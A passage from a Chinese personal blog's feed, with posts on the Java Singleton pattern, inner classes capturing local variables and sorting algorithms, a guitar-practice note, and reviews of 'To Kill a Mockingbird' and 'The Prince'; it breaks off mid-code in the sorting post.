class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//提供一个静态的公有方法，加入双重检查代码，解决线程安全问题，同时解决懒加载问题</span></span><br><span class="line">    <span class="comment">//同时保证了效率，推荐使用</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Singleton <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (instance == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">synchronized</span> (Singleton.class) &#123;</span><br><span class="line">                <span class="keyword">if</span> (instance == <span class="keyword">null</span>) &#123;</span><br><span class="line">                    instance = <span class="keyword">new</span> Singleton();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>静态内部类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Singleton</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">Singleton</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//写一个静态内部类，该类中有一个静态属性Singleton</span></span><br><span class="line">    <span class="comment">//在调用getInstance()方法时，静态内部类才会被装载，保证了懒加载;同时类加载是线程安全的</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">SingletonInstance</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Singleton INSTANCE = <span class="keyword">new</span> Singleton();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//提供一个静态的公有方法，直接返回SingletonInstance.INSTANCE</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Singleton <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> SingletonInstance.INSTANCE;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="5-应用场景"><a href="#5-应用场景" class="headerlink" title="5. 应用场景"></a>5. 应用场景</h2><p><strong>如果程序中的某个类对于所有客户端只有一个可用的实例， 可以使用单例模式。</strong></p><p>单例模式禁止通过除特殊构建方法以外的任何方式来创建自身类的对象。 该方法可以创建一个新对象， 但如果该对象已经被创建， 则返回已有的对象。</p><p><strong>如果你需要更加严格地控制全局变量， 可以使用单例模式。</strong></p><p>单例模式与全局变量不同， 它保证类只存在一个实例。 除了单例类自己以外， 无法通过任何方式替换缓存的实例。</p><p>请注意， 你可以随时调整限制并设定生成单例实例的数量， 只需修改 获取实例方法， 即 getInstance 中的代码即可实现。</p>]]></content>
    
    
    <summary type="html">单例模式是一种创建型设计模式， 让你能够保证一个类只有一个实例， 并提供一个访问该实例的全局节点。</summary>
    
    
    
    <category term="设计模式" scheme="http://lishuaiyun.cn/categories/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"/>
    
    
    <category term="设计模式" scheme="http://lishuaiyun.cn/tags/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"/>
    
  </entry>
  
  <entry>
    <title>安河桥间奏</title>
    <link href="http://lishuaiyun.cn/2021/04/30/%E5%AE%89%E6%B2%B3%E6%A1%A5%E9%97%B4%E5%A5%8F/"/>
    <id>http://lishuaiyun.cn/2021/04/30/%E5%AE%89%E6%B2%B3%E6%A1%A5%E9%97%B4%E5%A5%8F/</id>
    <published>2021-04-30T10:21:14.000Z</published>
    <updated>2022-03-26T12:12:41.303Z</updated>
    
    <content type="html"><![CDATA[<p>&emsp;&emsp;一直都挺喜欢听歌的，萌生学吉他的念头大概是寒假闲来无事刷视频，梁博的《黑夜中》尾奏，《给我一点温度》尾奏着实把我迷到了，上午有个这个念头以后就再也抑制不住，下午就买了吉他，现在练习了两个月之后差不多比较完整的还原了指弹《安河桥》间奏，还是挺开心的，放上链接：</p><p><a href="https://www.bilibili.com/video/BV1jK4y1Z7dq/">学习吉他两个月后我弹出了安河桥间奏_哔哩哔哩 (゜-゜)つロ 干杯~-bilibili</a></p><p>&emsp;&emsp;没找到安河桥好看的封面，拿博哥当封面🤭</p><p>&emsp;&emsp;下一首不学指弹，准备弹唱万青的《杀死那个石家庄人》。</p>]]></content>
    
    
    <summary type="html">练习两个月吉他弹出的安河桥间奏</summary>
    
    
    
    <category term="生活" scheme="http://lishuaiyun.cn/categories/%E7%94%9F%E6%B4%BB/"/>
    
    
    <category term="吉他" scheme="http://lishuaiyun.cn/tags/%E5%90%89%E4%BB%96/"/>
    
  </entry>
  
  <entry>
    <title>杀死一只知更鸟</title>
    <link href="http://lishuaiyun.cn/2021/04/23/%E6%9D%80%E6%AD%BB%E4%B8%80%E5%8F%AA%E7%9F%A5%E6%9B%B4%E9%B8%9F/"/>
    <id>http://lishuaiyun.cn/2021/04/23/%E6%9D%80%E6%AD%BB%E4%B8%80%E5%8F%AA%E7%9F%A5%E6%9B%B4%E9%B8%9F/</id>
    <published>2021-04-23T14:59:40.000Z</published>
    <updated>2022-03-26T13:15:49.622Z</updated>
    
    <content type="html"><![CDATA[<p>&emsp;&emsp;《杀死一只知更鸟》前半部分很枯燥，基本都是在交代故事背景，埋下伏笔，甚至我是硬着头皮看下去的，当小说进行到后半部分高潮迭起，并与前文的伏笔一一呼应，才让我明白了这的确是一本不可多得的好书。</p><p>&emsp;&emsp;故事发生在上个世纪三十年代初，虽然美国已经废除了奴隶制，但对黑人的歧视仍根植于每个白人的血液里，但是阿迪克斯顶着社会舆论的压力要为黑人汤姆辩护，因为汤姆被人指责强奸，但他是无辜的，尽管没有白人愿意相信，各种流言蜚语冲击着阿迪克斯的家庭，但他仍然坚定自己的信念，他是个完美的父亲，教导孩子保持善良，坚守勇敢，反对暴力。</p><p>他始终不愿意满足杰姆持枪的愿望，后来杰姆知道自己的父亲是小镇第一神枪手，但他却从来不主张用枪。</p><p>他教导杰姆什么是勇敢：<strong>不要错误地认为一个人手握枪支就是勇敢。勇敢就是，在你还没开始的时候就知道自己注定会输，但依然义无反顾地去做，并且不管发生什么都坚持到底。一个人很少能赢，但有时也会。</strong></p><p>他在法庭上义正言辞的为黑人辩护：<strong>我不是一个理想主义者，我并不坚信我们的法庭和我们的陪审制度完美无缺、公正无私——它们对我来说，不是理想，而是活生生的工作状态。先生们，法庭不会比坐在我面前的任何一位陪审团成员更公正。法庭只能和它的陪审团一样完善，而陪审团只能和它的每一位成员一样完善。我对诸位先生充满信心，相信你们会用理性的眼光重新审查你们听到的证词，做出一个裁决，让被告和家人团聚。以上帝的名义，尽你们的职责吧。</strong></p><p>可惜，最终阿迪克斯的演讲没有战胜偏见，法庭上的众多白人在无可辩驳的事实前仍然选择了处死黑人汤姆。</p><p>是的，阿迪克斯知道自己很难战胜人们心中的偏见，但他仍然坚定地为黑人辩护，他用实际行动践行了自己对勇敢的定义，<strong>你还没开始的时候就知道自己注定会输，但依然义无反顾地去做，并且不管发生什么都坚持到底。</strong></p><p>故事的另一条线是怪人拉德利，小镇上的人从不让孩子靠近拉德利家，人们认为他是恶魔，小镇上的很多邪恶勾当都和拉德利脱不开关系，流言蜚语迫使拉德利不愿出门。</p><p>但所有人都误会了他，他通过树洞送给孩子们礼物，帮杰姆把裤子缝好放在篱笆旁，当斯科特和杰姆有生命危险时，他挺身而出。书中结尾，斯科特被救后第一次见到拉德利的时的问候：</p><p><strong>“你好，怪人”</strong></p><p>面对未知的事物，自己不了解的人，不应该有先入为主的判断，耳听为虚，眼见为实，偏见是最没有礼貌的事。</p><p><strong>你永远也不可能真正了解一个人，除非你穿上他的鞋子走来走去，站在他的角度考虑问题。</strong></p><p>还有一些精彩的句子：</p><p>除了恐惧本身，没有什么可恐惧的。</p><p>你为什么这么做？”杰姆轻声轻气地说：“她说你替黑鬼和人渣打官司。”</p><p>“他们当然有权利那样想，他们的看法也有权得到充分的尊重，”阿迪克斯说，“但是，我在接受他人之前，首先要接受自己。有一种东西不能遵循从众原则，那就是人的良心。”</p><p>杰姆平静地回了一句：“我妹妹不邋遢，我也不怕你。”</p><p>“一个人没必要把自己懂的东西都展现出来。这不是淑女的做派——再说了，人们不喜欢他们身边有什么人比他们懂得多。这会让他们气不打一处来。你使用的语言再标准，也改变不了他们。除非他们自己想学，否则一点儿办法也没有。你要么闭上嘴巴，要么跟他们说一样的话。”</p><p>阿迪克斯说过，与人交谈的礼貌做法是谈论对方感兴趣的事情，而不是大谈特谈自己的兴趣点。</p><p>我不是一个理想主义者，我并不坚信我们的法庭和我们的陪审制度完美无缺、公正无私——它们对我来说，不是理想，而是活生生的工作状态。先生们，法庭不会比坐在我面前的任何一位陪审团成员更公正。法庭只能和它的陪审团一样完善，而陪审团只能和它的每一位成员一样完善。我对诸位先生充满信心，相信你们会用理性的眼光重新审查你们听到的证词，做出一个裁决，让被告和家人团聚。以上帝的名义，尽你们的职责吧。</p><p>在我们生活的这个世界上，总有什么东西让人丧失理智——即使他们努力想做到公平，结果还是事与愿违。在我们的法庭上，当对立双方是一个白人和一个黑人的时候，白人总是胜诉。这些事情很丑恶，可现实生活就是如此。”</p>]]></content>
    
    
    <summary type="html">一个人很少能赢，但有时也会。</summary>
    
    
    
    <category term="读书分享" scheme="http://lishuaiyun.cn/categories/%E8%AF%BB%E4%B9%A6%E5%88%86%E4%BA%AB/"/>
    
    
    <category term="小说" scheme="http://lishuaiyun.cn/tags/%E5%B0%8F%E8%AF%B4/"/>
    
  </entry>
  
  <entry>
    <title>君主论</title>
    <link href="http://lishuaiyun.cn/2021/04/21/%E5%90%9B%E4%B8%BB%E8%AE%BA/"/>
    <id>http://lishuaiyun.cn/2021/04/21/%E5%90%9B%E4%B8%BB%E8%AE%BA/</id>
    <published>2021-04-21T11:40:21.000Z</published>
    <updated>2021-04-30T10:18:45.000Z</updated>
    
    <content type="html"><![CDATA[<p>&emsp;&emsp;《君主论》统共26章，每章短则2页，长则5~6页，全书不过是个120多页的小册子，但却始终在输出硬核内容，但《君主论》也有它的局限性，一是作者马基雅维里自己并不是君主，只是从一个臣子的角度出发来描述他对成为一个合格的君主的理解。二是该书写于16世纪，受时代局限性的影响，书中的很多道理放到现代已经不再适用，但瑕不掩瑜，《君主论》仍不失为一本很好的思想读物，它是一本超现实主义的书，并且阐明作为君主并不应该排除使用一些污龊邪恶的手段，因为这些手段可能是不光彩的，但可能反而是种善良。</p><p>&emsp;&emsp;结合《君主论》的内容来看，现代很多事情都得到了合理的解释。比如书中提到了征服国家的方式，文化征服如日本侵略中国让中国学习日语，英国将英语设为印度官方语言。再比如派遣殖民到殖民地，历史上霍去病击败匈奴进行了移民完成了吞并。三是一个强大的国家必须设法成为周围地区的首领，不让同样强大的国家插手自己周围地区的事务，中国的抗美援朝显然是个典型的例子。最后马基雅维里还总结了国家的强大不是绝对量，而是相对量，对于威胁到统治安全的势力，绝对不能心慈手软，一定要心狠手辣，斩草除根（这可能也是美国要遏制中国强大的原因）。</p><p>&emsp;&emsp;在谈论如何征服国家之后，作者接着又探讨了获取君主国的方式，如果一个人靠自己的能力创建了国家，那么创建的过程是艰辛的，而保持是容易的。与之相反，如果是依靠别人的武力或者仅仅是靠幸运登上王位的，我们没有任何理由相信有人生而知之，懂得怎样治理国家，除非他们真的具有卓越的才能。如果一个人以邪恶手段获得君权，那么应该慎重的决定采取邪恶的手段是否是有必要的，如果是有必要的，那么应该毕其功于一役，一次将坏事做尽，而后恩惠应该一点点的赐予。（这可能就是长痛不如短痛，但一点点不断的恩惠却能让人记住你的好）。</p><p>&emsp;&emsp;关于军事方面，君主不在逼不得已的情况下绝不应该借助援军或者雇佣军，这其实是显而易见的道理，因为仅仅是同盟或者金钱利益维系的关系的脆弱的，贤明的君主必须要拥有自己的军队，作者甚至认为君主不应该关心其他，而应该仅仅关注战争，军事，居安思危，即使在和平时期也应该永远不让自己的思想离开军事。将治理国家交给合适的人去做。如果是作为独裁的君主，我认为这种说法并无不妥。</p><p>&emsp;&emsp;关于君主的品格，君主应该接受吝啬的标签，一味的慷慨会使自己的财富丢失，或者由慷慨转为吝啬会使人新胜怨恨，但君主可以慷他人之慨，因为这既不是自己的财富也收买了人心（比如纵兵劫掠）。君主应该被人畏惧也被人爱戴，但一定要作出取舍，那么被人畏惧胜过被人爱戴，因为人性是恶劣的，人们冒犯一个自己爱戴的人比冒犯一个自己畏惧的人有更少的顾忌。（被人畏惧但不能招致仇恨）</p><p>&emsp;&emsp;一位君主必须依靠自己的行动去赢得伟大人物与才智非凡的声誉。如果他公开表示自己毫无保留地赞助某方而反对另一方的话，这位君主也会受到尊重。这种方法总是比保持中立更有用处。因为如果你的两个强大的邻国相打起来的话，情况必定是这样：它们当中一国战胜的时候，你必须害怕这个战胜国，或者你不用害怕它。在这两种情况之中，无论将来出现哪一种情况，你公开表态并且勇猛地参战总是有好处的。因为，如果在前一种情况之下，你不公开表态，你将来总要成为胜利者的战利品，而使那个战败者因而感到高兴和满意，而且你还提不出任何理由和任何事情为你辩护，或者使人庇护你，因为胜利者不需要在处于逆境时不援助自己的可疑的朋友；那个失败者也不会庇护你，因为你过去不愿拿起武器同他共命运。（但不能为了进攻别的国家而和比自己强大的国家结盟）。</p><p>&emsp;&emsp;君主论的作者马基雅维里是真小人，他毫不掩饰君主应该杀伐果断，并且为了利益可以适当的做一些不光明的手段，这其实是很合理的事情，并且读完也让我明晰各国发生的事情都有背后的原因，获益良多。</p><p>&emsp;&emsp;话说君主论之前上学期我还读了非暴力沟通，怎样阅读一本书，小王子，黑客与画家，看看有无时间也整理一下笔记吧。下一本书准备读《乌合之众》。</p>]]></content>
    
    
    <summary type="html">一本现实主义的政治学读物</summary>
    
    
    
    <category term="读书分享" scheme="http://lishuaiyun.cn/categories/%E8%AF%BB%E4%B9%A6%E5%88%86%E4%BA%AB/"/>
    
    
    <category term="君主论" scheme="http://lishuaiyun.cn/tags/%E5%90%9B%E4%B8%BB%E8%AE%BA/"/>
    
    <category term="政治学" scheme="http://lishuaiyun.cn/tags/%E6%94%BF%E6%B2%BB%E5%AD%A6/"/>
    
  </entry>
  
  <entry>
    <title>内部类引用局部变量的若干问题</title>
    <link href="http://lishuaiyun.cn/2021/04/11/%E5%86%85%E9%83%A8%E7%B1%BB%E5%BC%95%E7%94%A8%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F%E7%9A%84%E8%8B%A5%E5%B9%B2%E9%97%AE%E9%A2%98/"/>
    <id>http://lishuaiyun.cn/2021/04/11/%E5%86%85%E9%83%A8%E7%B1%BB%E5%BC%95%E7%94%A8%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F%E7%9A%84%E8%8B%A5%E5%B9%B2%E9%97%AE%E9%A2%98/</id>
    <published>2021-04-11T10:23:43.000Z</published>
    <updated>2022-03-26T13:15:25.561Z</updated>
    
    <content type="html"><![CDATA[<p>最近在学习NIO的时候看到一个demo如下(删减了部分无用代码)：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">   <span class="comment">//遍历目录文件</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">       <span class="comment">//方式1不可用,没有初始化</span></span><br><span class="line">       <span class="keyword">int</span> count1;</span><br><span class="line">       <span class="comment">//方式2不可用，不满足需要修改的诉求</span></span><br><span class="line">       <span class="keyword">int</span> count2 = <span class="number">0</span>;</span><br><span class="line">       <span class="comment">//方式3不可用，不满足需要修改诉求</span></span><br><span class="line">       Integer count3 = <span class="number">0</span>;</span><br><span class="line">       <span class="comment">//方式4可用</span></span><br><span class="line">       AtomicInteger count3 = <span class="keyword">new</span> AtomicInteger();</span><br><span class="line">       </span><br><span class="line">       Files.walkFileTree(Paths.get(<span class="string">&quot;E:\\Java\\jdk1.8&quot;</span>), <span class="keyword">new</span> SimpleFileVisitor&lt;Path&gt;()&#123;</span><br><span class="line"></span><br><span class="line">           <span class="meta">@Override</span></span><br><span class="line">           <span class="function"><span class="keyword">public</span> FileVisitResult <span class="title">preVisitDirectory</span><span class="params">(Path dir, BasicFileAttributes attrs)</span> <span class="keyword">throws</span> IOException </span>&#123;<span class="comment">//进入文件之前访问文件夹</span></span><br><span class="line">               System.out.println(<span class="string">&quot;====&gt;&quot;</span>+dir);</span><br><span class="line">               count3.incrementAndGet();</span><br><span class="line">               <span class="keyword">return</span> <span class="keyword">super</span>.preVisitDirectory(dir, attrs);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>发现了如下问题：</p><ul><li>需要修改局部变量则不能使用int和Integer修饰变量</li><li>局部变量必须使用final修饰</li><li>局部变量必须初始化</li></ul><h1 id="1-必须对局部变量进行初始化"><a href="#1-必须对局部变量进行初始化" class="headerlink" title="1. 必须对局部变量进行初始化"></a>1. 必须对局部变量进行初始化</h1><p>JVM会对全局变量初始化，基本类型数据为0，对象引用为null。</p><p>但Java规定局部变量必须进行初始化，因为开发者认为未初始化的局部变量更有可能是程序员疏忽，采用默认值反而会掩盖这种错误。（Thinking in Java）<br>所以方式1不可行。</p><h1 id="2-为什么不能直接使用int修饰变量"><a href="#2-为什么不能直接使用int修饰变量" class="headerlink" title="2. 为什么不能直接使用int修饰变量"></a>2. 为什么不能直接使用int修饰变量</h1><p>即使对局部变量初始化，使用int也是不可行的。</p><p>局部内部类，如果希望访问所在方法得局部变量，那么这个局部变量必须是final的。</p><p>原因：</p><ul><li>new出来的对象在堆内存中。</li><li>局部变量跟随方法，在栈内存中。</li><li>方法运行结束之后，立刻出栈，局部变量就会立刻消失。</li><li>但是new出来的对象在堆中持续存在，直到垃圾回收消失。此时所访问的局部变量是复制得来的，这就要求所复制的局部变量必须是不变常量。</li></ul><p>所以方式2使用count的方式是不可行的。如果使用final修饰则在内部类中是可以访问的。（JDK1.8不必再使用final修饰，后面会说明）</p><h1 id="3-JDK1-8之后不必再显式使用final修饰"><a href="#3-JDK1-8之后不必再显式使用final修饰" class="headerlink" title="3. JDK1.8之后不必再显式使用final修饰"></a>3. JDK1.8之后不必再显式使用final修饰</h1><p>JDK1.8之后内部类访问局部变量<strong>编译时</strong>会隐式的为使用到的局部变量添加final修饰。在JDK1.8中使用方式2是可以在匿名内部类中访问局部变量的，但<strong>无法修改</strong>。</p><h1 id="4-为什么使用AtomicInteger"><a href="#4-为什么使用AtomicInteger" class="headerlink" title="4. 为什么使用AtomicInteger"></a>4. 为什么使用AtomicInteger</h1><p>被final修饰的变量：</p><ul><li>对于基本类型，final 使数值不变；</li><li>对于引用类型，final 使引用不变，也就不能引用其它对象，但是被引用的对象本身是可以修改的。</li></ul><p>因为在内部类中有访问并<strong>修改</strong>局部变量的请求，在隐式为局部变量添加final后：</p><ul><li>如果局部变量是基本数据类型，则保存的数值无法再改变。不满足修改诉求。</li><li>如果使用Integer也是不行的，虽然Integer使用引用传递，但Integer的value是使用final修饰的:</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">int</span> value;</span><br></pre></td></tr></table></figure><p>而AtomicInteger 是引用传递，并且value：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">volatile</span> <span class="keyword">int</span> value;</span><br></pre></td></tr></table></figure><p>所以使用AtomicInteger是合理的。</p><p>因为lambda表达式类似于匿名内部类的语法糖，所以上述情况也适用于lambda表达式。（事实上lambda并不等于匿名内部类的语法糖）。</p>]]></content>
    
    
    <summary type="html">学习NIO时遇到的问题。</summary>
    
    
    
    <category term="Java" scheme="http://lishuaiyun.cn/categories/Java/"/>
    
    
    <category term="JVM" scheme="http://lishuaiyun.cn/tags/JVM/"/>
    
    <category term="Java" scheme="http://lishuaiyun.cn/tags/Java/"/>
    
    <category term="NIO" scheme="http://lishuaiyun.cn/tags/NIO/"/>
    
  </entry>
  
  <entry>
    <title>排序</title>
    <link href="http://lishuaiyun.cn/2021/03/18/%E6%8E%92%E5%BA%8F/"/>
    <id>http://lishuaiyun.cn/2021/03/18/%E6%8E%92%E5%BA%8F/</id>
    <published>2021-03-18T13:12:02.000Z</published>
    <updated>2022-03-26T13:15:32.613Z</updated>
    
    <content type="html"><![CDATA[<p>以下代码全部为升序排列</p><h1 id="1-冒泡排序"><a href="#1-冒泡排序" class="headerlink" title="1. 冒泡排序"></a>1. 冒泡排序</h1><p>比较相邻的元素。如果第一个比第二个大，就交换他们两个。对每一对相邻元素作同样的工作，从开始第一对到结尾的最后一对。这步做完后，最后的元素会是最大的数。针对所有的元素重复以上的步骤，除了最后一个。持续每次对越来越少的元素重复上面的步骤，直到没有任何一对数字需要比较。</p><p>冒泡排序中产生的有序子序列一定是全局有序的，也就是说，有序子序列中的所有元素一定小于或大于无序子序列的所有元素的关键字，这样每趟排序都会将一个元素放置到其最终的位置上。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">bubbleSort</span><span class="params">(<span class="keyword">int</span>[] arr)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> temp = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = arr.length - <span class="number">1</span>; i &gt; <span class="number">0</span>; i--) &#123; <span class="comment">// 每次需要排序的长度</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; i; j++) &#123; <span class="comment">// 从第一个元素到第i个元素</span></span><br><span class="line">            <span class="keyword">if</span> (arr[j] &gt; arr[j + <span class="number">1</span>]) &#123;</span><br><span class="line">                temp = arr[j];</span><br><span class="line">                arr[j] = arr[j + <span class="number">1</span>];</span><br><span class="line">                arr[j + <span class="number">1</span>] = temp;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="comment">//loop j</span></span><br><span class="line">    &#125;<span class="comment">//loop i</span></span><br><span class="line">&#125;<span class="comment">// method bubbleSort</span></span><br></pre></td></tr></table></figure><p><strong>优化</strong></p><p>要使算法在最佳情况下有O(n)复杂度，需要做一些改进，增加一个<code>swap</code>的标志，当前一轮没有进行交换时，说明数组已经有序，没有必要再进行下一轮的循环了，直接退出。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">bubbleSort</span><span class="params">(<span class="keyword">int</span>[] arr)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> temp = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">boolean</span> swap;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = arr.length - <span class="number">1</span>; i &gt; <span class="number">0</span>; i--) &#123; <span class="comment">// 每次需要排序的长度</span></span><br><span class="line">        swap=<span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; i; j++) &#123; <span class="comment">// 从第一个元素到第i个元素</span></span><br><span class="line">            <span class="keyword">if</span> (arr[j] &gt; arr[j + <span class="number">1</span>]) &#123;</span><br><span class="line">                temp = arr[j];</span><br><span class="line">                arr[j] = arr[j + <span class="number">1</span>];</span><br><span class="line">                arr[j + <span class="number">1</span>] = temp;</span><br><span class="line">                swap=<span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (swap==<span class="keyword">false</span>)&#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="2-选择排序"><a href="#2-选择排序" class="headerlink" title="2. 选择排序"></a>2. 选择排序</h1><p>每次遍历找到未排序元素中的最小元素放在已经排序的元素末尾。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">selectionSort</span><span class="params">(<span class="keyword">int</span>[] arr)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> temp, min = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; arr.length - <span class="number">1</span>; i++) &#123;</span><br><span class="line">        min = i;</span><br><span class="line">        <span class="comment">// 循环查找最小值</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = i + <span class="number">1</span>; j &lt; arr.length; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (arr[min] &gt; arr[j]) &#123;</span><br><span class="line">                min = j;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (min != i) &#123;</span><br><span class="line">            temp = arr[i];</span><br><span class="line">            arr[i] = arr[min];</span><br><span class="line">            arr[min] = temp;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="3-插入排序"><a href="#3-插入排序" class="headerlink" title="3. 插入排序"></a>3. 插入排序</h1><p>将第一待排序序列第一个元素看做一个有序序列，把第二个元素到最后一个元素当成是未排序序列。</p><p>从头到尾依次扫描未排序序列，将扫描到的每个元素插入有序序列的适当位置。（如果待插入的元素与有序序列中的某个元素相等，则将待插入元素插入到相等元素的后面。）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">insertionSort</span><span class="params">(<span class="keyword">int</span>[] arr)</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>; i&lt;arr.length; ++i)&#123;</span><br><span class="line">        <span class="keyword">int</span> value = arr[i];</span><br><span class="line">        <span class="keyword">int</span> position=i;</span><br><span class="line">        <span class="keyword">while</span> (position&gt;<span class="number">0</span> &amp;&amp; arr[position-<span class="number">1</span>]&gt;value)&#123;</span><br><span class="line">            arr[position] = arr[position-<span class="number">1</span>];</span><br><span class="line">            position--;</span><br><span class="line">        &#125;</span><br><span class="line">        arr[position] = value;</span><br><span class="line">    &#125;<span class="comment">//loop i</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="4-希尔排序"><a href="#4-希尔排序" class="headerlink" title="4. 希尔排序"></a>4. 希尔排序</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">shellSort</span><span class="params">(<span class="keyword">int</span>[] arr)</span> </span>&#123;</span><br><span class="line">    <span 